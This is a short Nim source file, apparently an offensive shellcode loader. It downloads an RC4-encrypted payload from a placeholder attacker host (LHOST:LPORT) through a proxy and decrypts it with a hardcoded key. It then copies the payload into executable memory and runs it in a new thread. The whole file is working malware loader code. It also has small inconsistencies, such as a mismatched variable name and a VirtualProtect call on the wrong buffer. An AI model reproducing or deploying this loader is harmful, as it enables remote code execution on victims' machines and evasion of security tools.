import RC4
import httpclient
import winim/lean

var
    custom_proxy = newProxy(url="http://PROXY_IP:PORT")
    old_protect : DWORD = PAGE_READWRITE
    client      = newHttpClient(proxy=custom_proxy)
    shellcode   = newseq[byte]()
    data        : string
    key         : string = "wutai.vl"
    dec         : string

func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))

proc main(): void = 
    # Get data and decode from RC4
    data = client.getContent("http://LHOST:LPORT/SHELLCODE")
    client.close()
    dec = fromRC4(key, data)
    shellcode = toByteSeq(dec)
    # Load in memory
    var shellcode_len = cast[SIZE_T](len(shellcode))
    var buffer = VirtualAlloc(nil, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    CopyMemory(buffer, &shellcode[0], shellcode_len);
    VirtualProtect(shellcode[0].addr, shellcode_len, PAGE_EXECUTE_READWRITE, oldProtect.addr)
    let create_thread : HANDLE = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](buffer), NULL, 0, NULL)
    WaitForSingleObject(create_thread, INFINITE)
    CloseHandle(create_thread)


when isMainModule:
    main()
